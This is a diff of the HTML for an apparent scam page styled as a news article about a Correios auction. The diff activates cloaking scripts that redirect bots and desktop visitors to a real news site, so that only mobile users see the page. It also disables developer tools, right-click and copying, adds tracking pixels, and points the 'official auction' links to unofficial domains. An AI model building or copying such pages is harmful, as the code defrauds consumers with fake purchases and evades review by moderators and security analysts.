@@ -1,6 +1,22 @@
 <!DOCTYPE html><html lang="en"><head><base href=""><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-    <!-- <script id="allow-copy_script">(function agent() {
+   <script>
+  window.pixelId = "680c7aa4624e3fbc35287bb8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+   <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+   
+     <script id="allow-copy_script">(function agent() {
         let unlock = false
         document.addEventListener('allow_copy', (event) => {
           unlock = event.detail.unlock
@@ -29,12 +45,12 @@
             capture: true,
           })
         })
-      })()</script> -->
-        <!-- <script>
-      // Função para detectar se é um dispositivo móvel
-      // function isMobile() {
-      //   return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      // }
+      })()</script>  
+         <script>
+       //Função para detectar se é um dispositivo móvel
+      function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+       }
     
       // Função para detectar se é um bot
       function isBot() {
@@ -52,23 +68,23 @@
       }
     
       // Redirecionar ou bloquear o acesso
-    //   function checkAccess() {
-    //     if (isBot() || (!isMobile() && isWideScreen())) {
-    //       // Redirecionar para se o acesso for bloqueado
+      function checkAccess() {
+        if (isBot() || (!isMobile() && isWideScreen())) {
+         // Redirecionar para se o acesso for bloqueado
     
-    //       window.location.href = "https://g1.globo.com/";
-    //     }
-    //   }
+          window.location.href = "https://g1.globo.com/";
+         }
+       }
     
       // Executar a função de verificação ao carregar a página
       window.onload = checkAccess;
     
       // Adicionar um listener para verificar novamente se a janela for redimensionada
-    //   window.addEventListener('resize', checkAccess);
-     </script> -->
-     <!-- <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
-     <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" disable-menu="true" clear-log="true" disable-select="true" disable-copy="true" disable-cut="true" disable-paste="true"></script> -->
-    <!-- <script type="text/javascript">
+       window.addEventListener('resize', checkAccess);
+     </script>  
+     <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
+     <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" disable-menu="true" clear-log="true" disable-select="true" disable-copy="true" disable-cut="true" disable-paste="true"></script>  
+     <script type="text/javascript">
             document.onkeydown = function (event) {
                  event = (event || window.event);
                  if (event.keyCode == 123 || event.keyCode == 18)
@@ -77,8 +93,8 @@
                  }
             }
             document.addEventListener('contextmenu', event => event.preventDefault());
-        </script> -->
-<!-- <script language="javascript">
+        </script>  
+ <script language="javascript">
 document.onmousedown=disableclick;
 status="Right Click Disabled";
 function disableclick(event)
@@ -89,8 +105,8 @@ function disableclick(event)
      return false;    
    }
 }
-</script> -->
-    <!-- <script language="JavaScript">
+</script> 
+    <script language="JavaScript">
     //Disable right click script
     var message = "";
     ///////////////////////////////////
@@ -118,9 +134,7 @@ function disableclick(event)
     }
     
     document.oncontextmenu = new Function("return false")
-    </script> -->
-    
-    
+    </script> 
     
 <link rel="stylesheet" href="styles.css">
     </head>
@@ -204,7 +218,7 @@ function disableclick(event)
             <span style="color: #474747; margin-top: 17px;">Início da nova edição — Foto: Correios</span>	
             
                     <p class="texto"> <br>
-                <b id="title">Como participar do leilão</b> <br>Para participar, os interessados devem acessar o site oficial do leilão dos Correios no portal <b>e-Licitações</b> (<i><b>retidadadepedido.online/leilao/</b></i>) e adquirir o lote desejado. O processo de compra é simples: basta escolher o lote, clicar no botão "comprar agora" e seguir para a página de pagamento e cadastro do endereço de entrega.<br><br>Após cadastrar o endereço, o comprador deve selecionar a opção de frete desejado e finalizar o pagamento. É importante ressaltar que os lotes são limitados e podem se esgotar rapidamente.<br><br></p>
+                <b id="title">Como participar do leilão</b> <br>Para participar, os interessados devem acessar o site oficial do leilão dos Correios no portal <b>e-Licitações</b> (<i><b>correios-leilao.vercel.app/</b></i>) e adquirir o lote desejado. O processo de compra é simples: basta escolher o lote, clicar no botão "comprar agora" e seguir para a página de pagamento e cadastro do endereço de entrega.<br><br>Após cadastrar o endereço, o comprador deve selecionar a opção de frete desejado e finalizar o pagamento. É importante ressaltar que os lotes são limitados e podem se esgotar rapidamente.<br><br></p>
                                     <img class="noticiaImage" src="images/upscale4.png" alt="">
             <span style="color: #474747; margin-top: 17px;">Prédio dos Correios para armazenamento e controle de estoque — Foto: Correios</span>	
     
@@ -237,7 +251,7 @@ function disableclick(event)
             
     <p></p>
     <p></p>
-    <a href="https://retidadadepedido.online/leilao" class="btn-cta"  style="display: inline-block; margin: 30px auto;">
+    <a href="https://correios-leilao.vercel.app/" class="btn-cta"  style="display: inline-block; margin: 30px auto;">
       ▶ ACESSAR LEILÃO AGORA
   </a>
         <p></p>
